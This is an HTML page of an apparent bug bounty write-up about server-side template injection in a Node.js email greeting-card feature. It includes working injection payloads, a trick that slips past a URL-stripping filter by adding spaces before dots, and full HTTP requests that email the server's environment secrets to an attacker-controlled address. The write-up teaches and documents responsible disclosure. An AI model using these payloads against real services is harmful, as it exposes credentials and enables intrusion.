@@ -1,0 +1,698 @@
+<!doctype html>
+<html lang="en" dir="auto" data-theme="auto">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta name="robots" content="index, follow" />
+    <title>How a single space turned an email invitation into RCE | dhtzs.dev</title>
+    <meta name="keywords" content="" />
+    <meta name="description" content="Escalating an SSTI in an email invitation feature to Node.js RCE and secret exposure by bypassing an unrelated URL filter with a single space." />
+    <meta name="author" content="Dimitris Chatzis" />
+    <link rel="canonical" href="https://dhtzs.dev/write-ups/1/" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Nunito&display=swap" rel="stylesheet" />
+    <link crossorigin="anonymous" href="/assets/css/stylesheet.css" rel="preload stylesheet" as="style" />
+    <link rel="icon" href="https://dhtzs.dev/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="16x16" href="https://dhtzs.dev/favicons/favicon-16x16.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="https://dhtzs.dev/favicons/favicon-32x32.png" />
+    <link rel="apple-touch-icon" href="https://dhtzs.dev/favicons/favicon-180x180.png" />
+    <link rel="mask-icon" href="https://dhtzs.dev/favicons/favicon.svg" />
+    <meta name="theme-color" content="#1D1E20" />
+    <meta name="msapplication-TileColor" content="#1D1E20" />
+    <link rel="alternate" hreflang="en" href="https://dhtzs.dev/write-ups/1/" />
+    <link rel="manifest" href="/manifest.json" />
+
+    <noscript>
+      <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+      </style>
+      <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+      </style>
+    </noscript>
+    <script>
+      if (localStorage.getItem("pref-theme") === "dark") {
+          document.querySelector("html").dataset.theme = "dark";
+      } else if (localStorage.getItem("pref-theme") === "light") {
+          document.querySelector("html").dataset.theme = "light";
+      } else if (window.matchMedia("(prefers-color-scheme: dark)").matches) {
+          document.querySelector("html").dataset.theme = "dark";
+      } else {
+          document.querySelector("html").dataset.theme = "light";
+      }
+    </script>
+    <meta property="og:url" content="https://dhtzs.dev/write-ups/1/" />
+    <meta property="og:site_name" content="dhtzs.dev" />
+    <meta property="og:title" content="How a single space turned an email invitation into RCE" />
+    <meta property="og:description" content="Escalating an SSTI in an email invitation feature to Node.js RCE and secret exposure by bypassing an unrelated URL filter with a single space." />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="article" />
+    <meta property="article:section" content="write-ups" />
+    <meta property="og:image" content="https://dhtzs.dev/images/logo.png" />
+
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:image" content="https://dhtzs.dev/images/logo.png" />
+    <meta name="twitter:title" content="How a single space turned an email invitation into RCE" />
+    <meta name="twitter:description" content="Escalating an SSTI in an email invitation feature to Node.js RCE and secret exposure by bypassing an unrelated URL filter with a single space." />
+
+    <script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "BreadcrumbList",
+        "itemListElement": [
+          {
+            "@type": "ListItem",
+            "position":  1 ,
+            "name": "Write-ups",
+            "item": "https://dhtzs.dev/write-ups/"
+          },
+          {
+            "@type": "ListItem",
+            "position":  2 ,
+            "name": "How a single space turned an email invitation into RCE",
+            "item": "https://dhtzs.dev/write-ups/1/"
+          }
+        ]
+      }
+    </script>
+    <script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "headline": "How a single space turned an email invitation into RCE",
+        "name": "How a single space turned an email invitation into RCE",
+        "description": "Escalating an SSTI in an email invitation feature to Node.js RCE and secret exposure by bypassing an unrelated URL filter with a single space.",
+        "keywords": [
+
+        ],
+        "articleBody": "Introduction Welcome to my first published write-up! I’m 25 now, and I began my bug bounty journey back in 2020 when I was 19. After a few years of researching and reporting vulnerabilities, I wanted my first post to highlight an older finding that still stands out to me — hoping it inspires newcomers entering cybersecurity, and maybe reminds experienced researchers how far methodical, creative thinking can take you.\nToday, AI has become an essential part of a security researcher’s toolkit, speeding up our workflows without replacing the curiosity and intuition behind the work. That said, this vulnerability dates back to before AI became part of the day-to-day process. There were no automated exploit chains or specialized tools involved — just manual testing, careful observation, and paying close attention to how the backend behaved.\nTarget overview The target redacted.com offered a feature that allowed users to send eGreeting Cards to any email address. The workflow was straightforward:\nSelect a card design (template). Enter the recipient’s details (name and email address). Write a custom message and send the card. While testing the form, one detail immediately caught my attention: whenever a URL was included in any input field, such as the message box, the backend intercepted it and replaced it. In the recipient’s inbox, the link appeared as [link removed].\nThis was a useful observation — it indicated that custom preprocessing logic was running on the server before the email was rendered and delivered.\nDiscovering the SSTI Because the application took user-supplied text and rendered it inside an email template on the backend — and allowed the sender to specify any recipient address — Server-Side Template Injection (SSTI) was a natural vector to explore. By setting an email address under my control as the recipient, I could use the delivered email itself to inspect how the server evaluated my input.\nI began testing basic SSTI payloads in the message field and inspecting the resulting emails. When I submitted:\n1 #{7*7} The email arrived in my inbox displaying:\n1 49 That confirmed it: user input was being evaluated directly by a server-side Node.js template engine.\n1 2 3 4 5 6 7 POST /sendGreetingCardEmail HTTP/1.1 Host: www.redacted.com Origin: https://www.redacted.com Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: connect.sid=[REDACTED] emailInformation%5Bmessage%5D=%23%7b7*7%7d\u0026emailInformation%5BcardID%5D=1\u0026emailInformation%5BrecipientEmail%5D=attacker@example.com\u0026emailInformation%5BdeliveryDate%5D=\u0026_csrf_token=[REDACTED] Bypassing the URL filter Confirming template injection is a strong starting point, but to demonstrate the real security impact — remote code execution and sensitive data exposure — I needed to access the Node.js process object and retrieve environment variables containing secrets.\nI submitted a payload to serialize values from process:\n1 #{JSON.stringify(Object.values(process)[59])} Instead of returning the expected output, the email rendered:\n1 [link removed] At first glance, this could easily be mistaken for a WAF or template-injection defense, but it was actually the same link filter I had noticed earlier. The backend appeared to use a regular expression that treated dot-separated words (such as JSON.stringify and Object.values) as domain names, flagging the expression as a URL and stripping it out before rendering.\nThis is where understanding the difference between a regex filter and an actual language parser makes all the difference.\nIn JavaScript, placing whitespace before a dot operator is completely valid syntax. To a simple URL regex, however, inserting a space breaks the word.word pattern it expects for a domain. All it took was adding a single space before each dot:\n1 #{JSON .stringify(Object .values(process)[59])} With that small adjustment, the URL filter ignored the string entirely while the JavaScript engine executed it without issue. Because the recipientEmail parameter was set to an address under my control (attacker@example.com), the application rendered the server-side output and emailed the Node process environment variables and secrets straight to my inbox.\n1 2 3 4 5 6 7 POST /sendGreetingCardEmail HTTP/1.1 Host: www.redacted.com Origin: https://www.redacted.com Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: connect.sid=[REDACTED] emailInformation%5Bmessage%5D=%23%7bJSON%20.stringify(Object%20.values(process)%5b59%5d)%7d\u0026emailInformation%5BcardID%5D=1\u0026emailInformation%5BrecipientEmail%5D=attacker@example.com\u0026emailInformation%5BdeliveryDate%5D=\u0026_csrf_token=[REDACTED] The dumped environment essentially handed over the keys to the production stack — including cloud infrastructure credentials, production database and migration logins, live payment and billing API keys, internal signing secrets, and access tokens for third-party integrations. That alone was more than enough to demonstrate critical impact without touching any of those services or pushing the exploit any further.\nLooking beyond a single endpoint The story didn’t actually end with the eGreeting Card feature. Whenever I uncover a vulnerability like this, I make it a habit to check whether similar patterns exist elsewhere across the application.\nAfter reporting the initial finding, I tested other API endpoints and email-related functionalities on redacted.com and discovered the exact same SSTI vulnerability affecting them as well. Because those endpoints were handled separately and did not share the same underlying backend or root cause, each finding was treated as an independent report — and rewarded individually.\nKey takeaways What makes this vulnerability memorable to me is how simple the final bypass turned out to be. Turning a blocked payload into a high-impact finding doesn’t always require an intricate exploit chain — sometimes an obstacle isn’t even a security control, just an unrelated filter acting more broadly than intended, and a single space is enough to work around it.\nIf you’re just getting started in bug bounty, try not to get discouraged when a payload gets stripped or blocked. Take a step back, figure out why the application reacted that way, and test how the underlying parser handles edge cases. That methodical mindset will serve you well at any stage of your journey, with or without AI.\nThanks for reading! If you have any thoughts, questions, or similar stories to share, feel free to reach out — I’m always happy to connect with fellow researchers.\nDisclosure timeline 2022-09-29: Vulnerability reported 2022-10-02: Triaged as Critical (CVSS 10.0) 2022-10-03: Resolved \u0026 bounty awarded ",
+        "wordCount" : "946",
+        "inLanguage": "en",
+        "image": "https://dhtzs.dev/images/logo.png","datePublished": "0001-01-01T00:00:00Z",
+        "dateModified": "0001-01-01T00:00:00Z",
+        "author":{
+          "@type": "Person",
+          "name": "Dimitris Chatzis"
+        },
+        "mainEntityOfPage": {
+          "@type": "WebPage",
+          "@id": "https://dhtzs.dev/write-ups/1/"
+        },
+        "publisher": {
+          "@type": "Organization",
+          "name": "dhtzs.dev",
+          "logo": {
+            "@type": "ImageObject",
+            "url": "https://dhtzs.dev/favicon.ico"
+          }
+        }
+      }
+    </script>
+  </head>
+  <body id="top">
+    <header class="header">
+      <nav class="header-nav">
+        <div class="logo">
+          <a href="https://dhtzs.dev/" accesskey="h" title="dhtzs.dev (Alt + H)">dhtzs.dev</a>
+          <div class="logo-switches">
+            <button id="theme-toggle" class="theme-toggle" accesskey="t" title="Toggle theme (Alt + T)" aria-label="toggle theme">
+              <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+              </svg>
+              <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="5"></circle>
+                <line x1="12" y1="1" x2="12" y2="3"></line>
+                <line x1="12" y1="21" x2="12" y2="23"></line>
+                <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                <line x1="1" y1="12" x2="3" y2="12"></line>
+                <line x1="21" y1="12" x2="23" y2="12"></line>
+                <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+              </svg>
+            </button>
+            <a href="https://dhtzs.dev/search/" class="search-toggle" accesskey="/" title="Search (Alt + /)" aria-label="search">
+              <svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="11" cy="11" r="8"></circle>
+                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+              </svg>
+            </a>
+          </div>
+        </div>
+        <ul id="menu" class="menu">
+          <li>
+            <a href="https://dhtzs.dev/" title="/home">
+              <span>/home</span>
+            </a>
+          </li>
+          <li>
+            <a href="https://dhtzs.dev/about-me/" title="/about-me">
+              <span>/about-me</span>
+            </a>
+          </li>
+          <li>
+            <a href="https://dhtzs.dev/write-ups/" title="/write-ups">
+              <span>/write-ups</span>
+            </a>
+          </li>
+          <li>
+            <a href="https://dhtzs.dev/contact-me/" title="/contact-me">
+              <span>/contact-me</span>
+            </a>
+          </li>
+        </ul>
+      </nav>
+    </header>
+    <main class="main">
+      <article class="post-single">
+        <header class="post-header">
+          <nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+            <a href="/">Home</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+              <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="/write-ups/">Write-ups</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+              <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+          </nav>
+          <h1 class="post-title entry-hint-parent">How a single space turned an email invitation into RCE</h1>
+          <div class="post-description">Escalating an SSTI in an email invitation feature to Node.js RCE and secret exposure by bypassing an unrelated URL filter with a single space.</div>
+          <div class="post-meta">
+            <span>5 min</span>
+            &nbsp;·&nbsp;
+            <span>946 words</span>
+            &nbsp;·&nbsp;
+            <span id="offlineReading"></span>
+          </div>
+        </header>
+        <details class="toc">
+          <summary accesskey="c" title="Toggle table of contents (Alt + C)">
+            <span class="title">Table of Contents</span>
+          </summary>
+
+          <div class="inner">
+            <nav id="TableOfContents">
+              <ul>
+                <li><a href="#introduction">Introduction</a></li>
+                <li><a href="#target-overview">Target overview</a></li>
+                <li><a href="#discovering-the-ssti">Discovering the SSTI</a></li>
+                <li><a href="#bypassing-the-url-filter">Bypassing the URL filter</a></li>
+                <li><a href="#looking-beyond-a-single-endpoint">Looking beyond a single endpoint</a></li>
+                <li><a href="#key-takeaways">Key takeaways</a></li>
+                <li><a href="#disclosure-timeline">Disclosure timeline</a></li>
+              </ul>
+            </nav>
+          </div>
+        </details>
+
+        <div class="post-content md-content">
+          <h2 id="introduction">Introduction</h2>
+          <p>Welcome to my first published write-up! I&rsquo;m 25 now, and I began my bug bounty journey back in 2020 when I was 19. After a few years of researching and reporting vulnerabilities, I wanted my first post to highlight an older finding that still stands out to me — hoping it inspires newcomers entering cybersecurity, and maybe reminds experienced researchers how far methodical, creative thinking can take you.</p>
+          <p>Today, AI has become an essential part of a security researcher&rsquo;s toolkit, speeding up our workflows without replacing the curiosity and intuition behind the work. That said, this vulnerability dates back to before AI became part of the day-to-day process. There were no automated exploit chains or specialized tools involved — just manual testing, careful observation, and paying close attention to how the backend behaved.</p>
+          <h2 id="target-overview">Target overview</h2>
+          <p>
+            The target
+            <code>redacted.com</code>
+            offered a feature that allowed users to send
+            <strong>eGreeting Cards</strong>
+            to any email address. The workflow was straightforward:
+          </p>
+          <ol>
+            <li>Select a card design (template).</li>
+            <li>Enter the recipient&rsquo;s details (name and email address).</li>
+            <li>Write a custom message and send the card.</li>
+          </ol>
+          <!-- ![Card creation page](path/to/screenshot-1.png) -->
+          <p>
+            While testing the form, one detail immediately caught my attention: whenever a URL was included in any input field, such as the message box, the backend intercepted it and replaced it. In the recipient&rsquo;s inbox, the link appeared as
+            <code>[link removed]</code>
+            .
+          </p>
+          <p>This was a useful observation — it indicated that custom preprocessing logic was running on the server before the email was rendered and delivered.</p>
+          <h2 id="discovering-the-ssti">Discovering the SSTI</h2>
+          <p>Because the application took user-supplied text and rendered it inside an email template on the backend — and allowed the sender to specify any recipient address — Server-Side Template Injection (SSTI) was a natural vector to explore. By setting an email address under my control as the recipient, I could use the delivered email itself to inspect how the server evaluated my input.</p>
+          <p>I began testing basic SSTI payloads in the message field and inspecting the resulting emails. When I submitted:</p>
+          <div class="highlight">
+            <div class="chroma">
+              <table class="lntable">
+                <tr>
+                  <td class="lntd">
+                    <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre>
+                  </td>
+                  <td class="lntd">
+                    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">#{7*7}
+</span></span></code></pre>
+                  </td>
+                </tr>
+              </table>
+            </div>
+          </div>
+          <p>The email arrived in my inbox displaying:</p>
+          <div class="highlight">
+            <div class="chroma">
+              <table class="lntable">
+                <tr>
+                  <td class="lntd">
+                    <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre>
+                  </td>
+                  <td class="lntd">
+                    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">49
+</span></span></code></pre>
+                  </td>
+                </tr>
+              </table>
+            </div>
+          </div>
+          <p>That confirmed it: user input was being evaluated directly by a server-side Node.js template engine.</p>
+          <div class="highlight">
+            <div class="chroma">
+              <table class="lntable">
+                <tr>
+                  <td class="lntd">
+                    <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre>
+                  </td>
+                  <td class="lntd">
+                    <pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/sendGreetingCardEmail</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">www.redacted.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">https://www.redacted.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded; charset=UTF-8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">connect.sid=[REDACTED]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">emailInformation%5Bmessage%5D=%23%7b7*7%7d&amp;emailInformation%5BcardID%5D=1&amp;emailInformation%5BrecipientEmail%5D=attacker@example.com&amp;emailInformation%5BdeliveryDate%5D=&amp;_csrf_token=[REDACTED]
+</span></span></code></pre>
+                  </td>
+                </tr>
+              </table>
+            </div>
+          </div>
+          <!-- ![Received email rendering 49](path/to/screenshot-2.png) -->
+          <h2 id="bypassing-the-url-filter">Bypassing the URL filter</h2>
+          <p>
+            Confirming template injection is a strong starting point, but to demonstrate the real security impact — remote code execution and sensitive data exposure — I needed to access the Node.js
+            <code>process</code>
+            object and retrieve environment variables containing secrets.
+          </p>
+          <p>
+            I submitted a payload to serialize values from
+            <code>process</code>
+            :
+          </p>
+          <div class="highlight">
+            <div class="chroma">
+              <table class="lntable">
+                <tr>
+                  <td class="lntd">
+                    <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre>
+                  </td>
+                  <td class="lntd">
+                    <pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="err">#</span><span class="p">{</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">values</span><span class="p">(</span><span class="nx">process</span><span class="p">)[</span><span class="mi">59</span><span class="p">])}</span>
+</span></span></code></pre>
+                  </td>
+                </tr>
+              </table>
+            </div>
+          </div>
+          <p>Instead of returning the expected output, the email rendered:</p>
+          <div class="highlight">
+            <div class="chroma">
+              <table class="lntable">
+                <tr>
+                  <td class="lntd">
+                    <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre>
+                  </td>
+                  <td class="lntd">
+                    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[link removed]
+</span></span></code></pre>
+                  </td>
+                </tr>
+              </table>
+            </div>
+          </div>
+          <p>
+            At first glance, this could easily be mistaken for a WAF or template-injection defense, but it was actually the same link filter I had noticed earlier. The backend appeared to use a regular expression that treated dot-separated words (such as
+            <code>JSON.stringify</code>
+            and
+            <code>Object.values</code>
+            ) as domain names, flagging the expression as a URL and stripping it out before rendering.
+          </p>
+          <p>This is where understanding the difference between a regex filter and an actual language parser makes all the difference.</p>
+          <p>
+            In JavaScript, placing whitespace before a dot operator is completely valid syntax. To a simple URL regex, however, inserting a space breaks the
+            <code>word.word</code>
+            pattern it expects for a domain. All it took was adding a single space before each dot:
+          </p>
+          <div class="highlight">
+            <div class="chroma">
+              <table class="lntable">
+                <tr>
+                  <td class="lntd">
+                    <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre>
+                  </td>
+                  <td class="lntd">
+                    <pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="err">#</span><span class="p">{</span><span class="nx">JSON</span> <span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nb">Object</span> <span class="p">.</span><span class="nx">values</span><span class="p">(</span><span class="nx">process</span><span class="p">)[</span><span class="mi">59</span><span class="p">])}</span>
+</span></span></code></pre>
+                  </td>
+                </tr>
+              </table>
+            </div>
+          </div>
+          <p>
+            With that small adjustment, the URL filter ignored the string entirely while the JavaScript engine executed it without issue. Because the
+            <code>recipientEmail</code>
+            parameter was set to an address under my control (
+            <code>attacker@example.com</code>
+            ), the application rendered the server-side output and emailed the Node process environment variables and secrets straight to my inbox.
+          </p>
+          <div class="highlight">
+            <div class="chroma">
+              <table class="lntable">
+                <tr>
+                  <td class="lntd">
+                    <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre>
+                  </td>
+                  <td class="lntd">
+                    <pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/sendGreetingCardEmail</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">www.redacted.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">https://www.redacted.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded; charset=UTF-8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">connect.sid=[REDACTED]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">emailInformation%5Bmessage%5D=%23%7bJSON%20.stringify(Object%20.values(process)%5b59%5d)%7d&amp;emailInformation%5BcardID%5D=1&amp;emailInformation%5BrecipientEmail%5D=attacker@example.com&amp;emailInformation%5BdeliveryDate%5D=&amp;_csrf_token=[REDACTED]
+</span></span></code></pre>
+                  </td>
+                </tr>
+              </table>
+            </div>
+          </div>
+          <!-- ![Redacted email showing leaked environment variables](path/to/screenshot-3.png) -->
+          <p>The dumped environment essentially handed over the keys to the production stack — including cloud infrastructure credentials, production database and migration logins, live payment and billing API keys, internal signing secrets, and access tokens for third-party integrations. That alone was more than enough to demonstrate critical impact without touching any of those services or pushing the exploit any further.</p>
+          <h2 id="looking-beyond-a-single-endpoint">Looking beyond a single endpoint</h2>
+          <p>The story didn&rsquo;t actually end with the eGreeting Card feature. Whenever I uncover a vulnerability like this, I make it a habit to check whether similar patterns exist elsewhere across the application.</p>
+          <p>
+            After reporting the initial finding, I tested other API endpoints and email-related functionalities on
+            <code>redacted.com</code>
+            and discovered the exact same SSTI vulnerability affecting them as well. Because those endpoints were handled separately and did not share the same underlying backend or root cause, each finding was treated as an independent report — and rewarded individually.
+          </p>
+          <h2 id="key-takeaways">Key takeaways</h2>
+          <p>What makes this vulnerability memorable to me is how simple the final bypass turned out to be. Turning a blocked payload into a high-impact finding doesn&rsquo;t always require an intricate exploit chain — sometimes an obstacle isn&rsquo;t even a security control, just an unrelated filter acting more broadly than intended, and a single space is enough to work around it.</p>
+          <p>
+            If you&rsquo;re just getting started in bug bounty, try not to get discouraged when a payload gets stripped or blocked. Take a step back, figure out
+            <em>why</em>
+            the application reacted that way, and test how the underlying parser handles edge cases. That methodical mindset will serve you well at any stage of your journey, with or without AI.
+          </p>
+          <p>Thanks for reading! If you have any thoughts, questions, or similar stories to share, feel free to reach out — I&rsquo;m always happy to connect with fellow researchers.</p>
+          <h2 id="disclosure-timeline">Disclosure timeline</h2>
+          <ul>
+            <li>
+              <strong>2022-09-29:</strong>
+              Vulnerability reported
+            </li>
+            <li>
+              <strong>2022-10-02:</strong>
+              Triaged as
+              <strong>Critical (CVSS 10.0)</strong>
+            </li>
+            <li>
+              <strong>2022-10-03:</strong>
+              Resolved &amp; bounty awarded
+            </li>
+          </ul>
+        </div>
+
+        <footer class="post-footer">
+          <ul class="post-tags"></ul>
+
+          <ul class="share-buttons">
+            <li>
+              <a target="_blank" rel="noopener noreferrer" aria-label="share How a single space turned an email invitation into RCE on x" href="https://x.com/intent/tweet/?text=How%20a%20single%20space%20turned%20an%20email%20invitation%20into%20RCE&amp;url=https%3a%2f%2fdhtzs.dev%2fwrite-ups%2f1%2f&amp;hashtags=">
+                <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                  <path d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
+                </svg>
+              </a>
+            </li>
+            <li>
+              <a target="_blank" rel="noopener noreferrer" aria-label="share How a single space turned an email invitation into RCE on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fdhtzs.dev%2fwrite-ups%2f1%2f&amp;title=How%20a%20single%20space%20turned%20an%20email%20invitation%20into%20RCE&amp;summary=How%20a%20single%20space%20turned%20an%20email%20invitation%20into%20RCE&amp;source=https%3a%2f%2fdhtzs.dev%2fwrite-ups%2f1%2f">
+                <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                  <path d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+                </svg>
+              </a>
+            </li>
+            <li>
+              <a target="_blank" rel="noopener noreferrer" aria-label="share How a single space turned an email invitation into RCE on whatsapp" href="https://api.whatsapp.com/send?text=How%20a%20single%20space%20turned%20an%20email%20invitation%20into%20RCE%20-%20https%3a%2f%2fdhtzs.dev%2fwrite-ups%2f1%2f">
+                <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                  <path d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 